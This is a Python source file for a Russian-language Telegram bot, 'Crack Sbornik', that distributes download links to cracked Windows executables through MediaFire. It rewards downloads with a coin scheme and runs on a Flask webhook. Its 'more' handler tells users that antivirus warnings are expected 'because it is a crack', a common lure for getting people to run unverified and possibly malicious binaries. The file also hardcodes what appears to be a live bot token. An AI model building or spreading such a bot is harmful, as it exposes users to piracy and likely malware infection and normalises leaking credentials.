import os
import time
from flask import Flask, request
import telebot
from telebot import types

# =============== НАСТРОЙКИ ===============
TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ⚠️ ЗАМЕНИ НА СВОЙ ТОКЕН!
ADMIN_ID = 7859226148  # ⚠️ ЗАМЕНИ НА СВОЙ ID!

# Ссылки
SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
IMAGE_URL = "https://i.ibb.co/KpKqsd8x/gg.png"
VIP_LINK = "https://www.mediafire.com/file/fh6v3l9v27jh4g7/Crack_Sbornik_VIP.exe/file"

# =============== ИНИЦИАЛИЗАЦИЯ ===============
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Данные
download_count = 0
users = set()
user_last_use = {}
waiting_for_report = {}
blacklist = set()
message_tracker = {}
coins_data = {}

# Файлы
BLACKLIST_FILE = "blacklist.txt"
MESSAGE_FILE = "messages.txt"
COINS_FILE = "coins.txt"

# =============== ЗАГРУЗКА ДАННЫХ ===============
def load_all():
    global blacklist, message_tracker, coins_data
    # Чёрный список
    if os.path.exists(BLACKLIST_FILE):
        with open(BLACKLIST_FILE, 'r') as f:
            blacklist = set(int(l.strip()) for l in f if l.strip())
    # Трекер сообщений
    if os.path.exists(MESSAGE_FILE):
        with open(MESSAGE_FILE, 'r') as f:
            for l in f:
                if l.strip():
                    parts = l.strip().split('|')
                    if len(parts) == 4:
                        message_tracker[int(parts[0])] = {"count": int(parts[1]), "username": parts[2], "name": parts[3]}
    # Монеты
    if os.path.exists(COINS_FILE):
        with open(COINS_FILE, 'r') as f:
            for l in f:
                if l.strip():
                    parts = l.strip().split('|')
                    if len(parts) == 2:
                        coins_data[int(parts[0])] = int(parts[1])
    print(f"✅ Загружено: {len(blacklist)} банов, {len(message_tracker)} пользователей, {len(coins_data)} с монетами")

def save_all():
    with open(BLACKLIST_FILE, 'w') as f:
        for uid in blacklist:
            f.write(f"{uid}\n")
    with open(MESSAGE_FILE, 'w') as f:
        for uid, data in message_tracker.items():
            f.write(f"{uid}|{data['count']}|{data['username']}|{data['name']}\n")
    with open(COINS_FILE, 'w') as f:
        for uid, coins in coins_data.items():
            f.write(f"{uid}|{coins}\n")

# =============== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===============
def is_banned(uid): return uid in blacklist
def is_admin(uid): return uid == ADMIN_ID
def get_coins(uid): return coins_data.get(uid, 0)
def add_coins(uid, amt): 
    coins_data[uid] = coins_data.get(uid, 0) + amt
    save_all()
def remove_coins(uid, amt):
    if coins_data.get(uid, 0) >= amt:
        coins_data[uid] = coins_data.get(uid, 0) - amt
        save_all()
        return True
    return False
def get_messages(uid): return message_tracker.get(uid, {}).get("count", 0)
def update_messages(uid, username, name):
    if uid in message_tracker:
        message_tracker[uid]["count"] += 1
    else:
        message_tracker[uid] = {"count": 1, "username": username or "", "name": name}
    save_all()

def check_cd(uid):
    now = time.time()
    if uid in user_last_use:
        if now - user_last_use[uid] < 5:
            return int(5 - (now - user_last_use[uid]))
    return 0
def update_cd(uid):
    user_last_use[uid] = time.time()

# =============== ОСНОВНЫЕ КОМАНДЫ ===============
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.send_message(uid, "❌ Вы забанены!")
        return
    users.add(uid)
    update_messages(uid, message.from_user.username, message.from_user.first_name)
    
    if get_coins(uid) == 0:
        add_coins(uid, 100)
        bot.send_message(uid, "🎁 +100 монет за регистрацию!")
    
    cd = check_cd(uid)
    if cd > 0:
        bot.send_message(uid, f"⏳ Подожди {cd} сек!")
        return
    update_cd(uid)
    
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📥 Скачать софт", callback_data="download"),
        types.InlineKeyboardButton("🎯 Подробнее", callback_data="more"),
        types.InlineKeyboardButton("👥 Поделиться", callback_data="share"),
        types.InlineKeyboardButton("📢 Репорт", callback_data="report"),
        types.InlineKeyboardButton("🌐 Статистика", callback_data="stats"),
        types.InlineKeyboardButton("🔝 VIP КРЯКИ", callback_data="vip")
    )
    bot.send_message(uid, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=kb)

@bot.message_handler(commands=['admin'])
def admin(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Нет доступа!")
        return
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users"),
        types.InlineKeyboardButton("📊 Трекер сообщений", callback_data="admin_tracker"),
        types.InlineKeyboardButton("💰 Управление монетами", callback_data="admin_coins"),
        types.InlineKeyboardButton("🚫 Забанить", callback_data="admin_ban"),
        types.InlineKeyboardButton("✅ Разбанить", callback_data="admin_unban")
    )
    bot.send_message(message.chat.id, "🔧 Админ-панель", reply_markup=kb)

@bot.message_handler(commands=['cancel'])
def cancel(message):
    uid = message.from_user.id
    if uid in waiting_for_report:
        del waiting_for_report[uid]
        bot.reply_to(message, "❌ Жалоба отменена.")

# =============== ОБРАБОТЧИКИ КНОПОК ===============
@bot.callback_query_handler(func=lambda call: call.data == "stats")
def stats(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    bot.answer_callback_query(call.id)
    text = f"📊 **Ваша статистика**\n\n"
    text += f"💰 Монеты: {get_coins(uid)}\n"
    text += f"💬 Сообщений: {get_messages(uid)}\n"
    text += f"🆔 ID: {uid}\n"
    text += f"👤 Имя: {call.from_user.first_name}\n"
    if call.from_user.username:
        text += f"📱 @{call.from_user.username}\n"
    text += f"\n🎁 **Как получить монеты?**\n"
    text += f"• +5 за сообщение\n• +10 за скачивание\n• +50 за жалобу\n• +100 за регистрацию"
    bot.send_message(uid, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "vip")
def vip(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    cd = check_cd(uid)
    if cd > 0:
        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
        return
    update_cd(uid)
    
    coins = get_coins(uid)
    if coins < 1250:
        bot.answer_callback_query(call.id, f"❌ Нужно 1250 монет! У вас {coins}", True)
        return
    remove_coins(uid, 1250)
    bot.answer_callback_query(call.id, f"✅ Снято 1250 монет!", False)
    bot.send_message(uid, f"🔝 **VIP КРЯКИ**\n\n🔗 {VIP_LINK}\n💰 Остаток: {get_coins(uid)}", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "download")
def download(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    cd = check_cd(uid)
    if cd > 0:
        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
        return
    update_cd(uid)
    global download_count
    download_count += 1
    add_coins(uid, 10)
    bot.answer_callback_query(call.id, "✅ +10 монет!", False)
    bot.send_message(uid, f"🔗 {SOFT_LINK}")

@bot.callback_query_handler(func=lambda call: call.data == "more")
def more(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    cd = check_cd(uid)
    if cd > 0:
        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
        return
    update_cd(uid)
    bot.answer_callback_query(call.id, "📸", False)
    bot.send_photo(uid, IMAGE_URL, caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️")

@bot.callback_query_handler(func=lambda call: call.data == "share")
def share(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    bot.answer_callback_query(call.id)
    bot.send_message(uid, f"👥 Поделиться:\nhttps://t.me/{bot.get_me().username}")

@bot.callback_query_handler(func=lambda call: call.data == "report")
def report_btn(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    cd = check_cd(uid)
    if cd > 0:
        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
        return
    update_cd(uid)
    bot.answer_callback_query(call.id)
    waiting_for_report[uid] = True
    bot.send_message(uid, "⚙️ Напишите текст жалобы\n(/cancel для отмены)")

# =============== ОБРАБОТКА ЖАЛОБ ===============
@bot.message_handler(func=lambda m: m.from_user.id in waiting_for_report)
def handle_report(m):
    uid = m.from_user.id
    text = m.text.strip()
    if uid in waiting_for_report:
        del waiting_for_report[uid]
    update_messages(uid, m.from_user.username, m.from_user.first_name)
    add_coins(uid, 50)
    bot.send_message(uid, "✅ Жалоба отправлена! +50 монет")
    bot.send_message(ADMIN_ID, f"📢 ЖАЛОБА от {m.from_user.first_name} (ID: {uid})\nТекст: {text}")

# =============== АДМИН-ОБРАБОТЧИКИ ===============
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_handlers(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа!", True)
        return
    bot.answer_callback_query(call.id)
    
    if call.data == "admin_stats":
        bot.send_message(call.message.chat.id, f"📊 Статистика:\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}")
    
    elif call.data == "admin_users":
        bot.send_message(call.message.chat.id, f"👥 Пользователей: {len(users)}")
    
    elif call.data == "admin_tracker":
        if not message_tracker:
            bot.send_message(call.message.chat.id, "Нет данных")
            return
        top = sorted(message_tracker.items(), key=lambda x: x[1]["count"], reverse=True)[:20]
        text = "📊 Топ по сообщениям:\n"
        for i, (uid, d) in enumerate(top, 1):
            name = d['username'] or d['name'][:15]
            text += f"{i}. {name} — {d['count']}\n"
        bot.send_message(call.message.chat.id, text)
    
    elif call.data == "admin_coins":
        kb = types.InlineKeyboardMarkup()
        kb.add(
            types.InlineKeyboardButton("➕ Добавить", callback_data="admin_add"),
            types.InlineKeyboardButton("➖ Убрать", callback_data="admin_remove"),
            types.InlineKeyboardButton("🔍 Проверить", callback_data="admin_check")
        )
        bot.send_message(call.message.chat.id, "💰 Управление монетами", reply_markup=kb)
    
    elif call.data == "admin_ban":
        msg = bot.send_message(call.message.chat.id, "Введите ID для бана:")
        bot.register_next_step_handler(msg, lambda m: ban_user(m))
    
    elif call.data == "admin_unban":
        msg = bot.send_message(call.message.chat.id, "Введите ID для разбана:")
        bot.register_next_step_handler(msg, lambda m: unban_user(m))

@bot.callback_query_handler(func=lambda call: call.data in ["admin_add", "admin_remove", "admin_check"])
def coins_admin(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа!", True)
        return
    bot.answer_callback_query(call.id)
    if call.data == "admin_add":
        msg = bot.send_message(call.message.chat.id, "Введите: ID количество (например: 123456789 100)")
        bot.register_next_step_handler(msg, lambda m: add_coins_admin(m))
    elif call.data == "admin_remove":
        msg = bot.send_message(call.message.chat.id, "Введите: ID количество (например: 123456789 50)")
        bot.register_next_step_handler(msg, lambda m: remove_coins_admin(m))
    elif call.data == "admin_check":
        msg = bot.send_message(call.message.chat.id, "Введите ID:")
        bot.register_next_step_handler(msg, lambda m: check_coins_admin(m))

def add_coins_admin(m):
    try:
        uid, amt = map(int, m.text.split())
        add_coins(uid, amt)
        bot.send_message(m.chat.id, f"✅ Добавлено {amt} монет. Баланс: {get_coins(uid)}")
    except: bot.send_message(m.chat.id, "❌ Ошибка")

def remove_coins_admin(m):
    try:
        uid, amt = map(int, m.text.split())
        if remove_coins(uid, amt):
            bot.send_message(m.chat.id, f"✅ Убрано {amt} монет. Баланс: {get_coins(uid)}")
        else: bot.send_message(m.chat.id, "❌ Недостаточно монет")
    except: bot.send_message(m.chat.id, "❌ Ошибка")

def check_coins_admin(m):
    try:
        uid = int(m.text.strip())
        bot.send_message(m.chat.id, f"💰 Баланс: {get_coins(uid)} монет")
    except: bot.send_message(m.chat.id, "❌ Ошибка")

def ban_user(m):
    try:
        uid = int(m.text.strip())
        if uid == ADMIN_ID:
            bot.send_message(m.chat.id, "❌ Нельзя забанить админа!")
            return
        blacklist.add(uid)
        save_all()
        bot.send_message(m.chat.id, f"✅ Пользователь {uid} забанен")
    except: bot.send_message(m.chat.id, "❌ Ошибка")

def unban_user(m):
    try:
        uid = int(m.text.strip())
        if uid in blacklist:
            blacklist.remove(uid)
            save_all()
            bot.send_message(m.chat.id, f"✅ Пользователь {uid} разбанен")
        else: bot.send_message(m.chat.id, "❌ Не в чёрном списке")
    except: bot.send_message(m.chat.id, "❌ Ошибка")

# =============== WEBHOOK ===============
@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return 'OK', 200
    return 'Bad Request', 400

@app.route('/')
def index():
    return "Bot is running!"

# =============== ЗАПУСК ===============
if __name__ == "__main__":
    load_all()
    try:
        bot.remove_webhook()
        print("✅ Webhook удалён")
    except: pass
    time.sleep(1)
    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'bot-tg-1-tw5w.onrender.com')}/{TOKEN}"
    bot.set_webhook(url=webhook_url)
    print(f"✅ Webhook: {webhook_url}")
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
